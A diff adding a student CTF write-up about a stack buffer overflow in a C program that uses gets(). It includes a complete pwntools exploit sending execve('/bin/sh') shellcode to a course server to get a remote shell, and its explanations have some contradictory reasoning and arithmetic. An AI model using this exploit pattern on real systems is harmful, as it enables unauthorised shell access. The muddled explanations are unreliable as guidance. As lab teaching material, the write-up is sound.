@@ -115,7 +115,7 @@
  
 ### Challenge 1
 
-* In this CTF challenge,first we explored the code provided and we saw how the query to login was made:
+* In this CTF challenge, first we explored the code provided and we saw how the query to login was made:
 
 ![](https://i.imgur.com/amrvSNs.png)
 
@@ -125,3 +125,90 @@
 ![](https://i.imgur.com/24v6lzd.png)
 
 * And we got the flag.
+
+### Challenge 2
+
+* This challenge is slightly different from the previous one. In fact, we have to explore a vulnerability to obtain access to a server. But first, we have to analyse the the ```program``` protections. To do that, we used the command ```checksec program``` and we obtained this:
+
+![](https://i.imgur.com/0lsnxDs.png)
+
+* We this info, we can conclude we cannot do a buffer overflow- eventhough we don't have a canary, PIE is enabled which means that there is memory address randomisation. However, there are RWX segments, which means that the binary files are writeable and executable at the same time. This allows us to inject and execute code.
+
+* After that, we have to analyse "main.c" to answer this questions. Here is the "main.c" file:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char buffer[100];
+
+    printf("Try to control this program.\n");
+    printf("Your buffer is %p.\n", buffer);
+    printf("Give me your input:\n");
+    fflush(stdout);
+   
+    gets(buffer);
+    
+    return 0;
+}
+```
+
+1) In which code line is the vulnerability?
+
+2) What we can do with the vulnerability?
+
+* Answers:
+
+1) The vulnerability is in line 12, since it is receiving the input of buffer and it can read more than the buffer's size. Then we have a buffer overflow vulnerability.
+
+2) We this vulnerability we can obtain the address of the buffer and inject the shellcode needed to seek the working directory.
+
+* After that, we need to create a file that creates the exploit by exploring the vulnerability. So we did our exploit_example.py, which is quite similar to the other exploit_examples of buffer overflow's labs.
+
+> Exploit_example.py:
+
+```python
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    p = process("./program")
+    pause()
+else:
+    p = remote("ctf-fsi.fe.up.pt", 4001)
+def get_address():
+    return p.recvline_contains(b'Your buffer is')[17:25]
+
+temp = get_address().decode('utf-8')
+print("This is our address: " + temp)
+
+address = bytearray.fromhex(temp)
+address.reverse()
+
+p.recvuntil(b":")
+offset=108
+shellcode= b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
+final_input = shellcode + b'\x90' * (offset-len(shellcode)) + address
+print(final_input)
+p.sendline(final_input)
+p.interactive()
+```
+
+* Firstly, we made a temporary variable to extract the ```buffer``` address. Then we to reverse it and enconding it again as byte array, as we did in the buffer overflow's labs.
+
+* After that, we need to analyse the executable stack:
+
+![](https://i.imgur.com/bDbtkjv.png)
+
+* Our executable stack will be similar to this one. At first, we need to insert the shellcode. However, the ```buffer``` has 100B and sheellcode has only 19. So, we need to write several NOP addresses in order to reach the return address without executing other functions, to be more precise we need to insert 108 NOP's = 123-19 B and a NOP has 1 B length. When we reach the return address, we inserted the ```buffer``` address.
+
+* When we tested it in the local mode, we opened a shell, which has meant that the exploit was successful:
+
+![](https://i.imgur.com/Zs1n4f8.png)
+
+* So, we turned off the local and we obatained the flag successfully, since we saw the "flag.txt" file:
+
+![](https://i.imgur.com/Wy8ssDH.png)
+
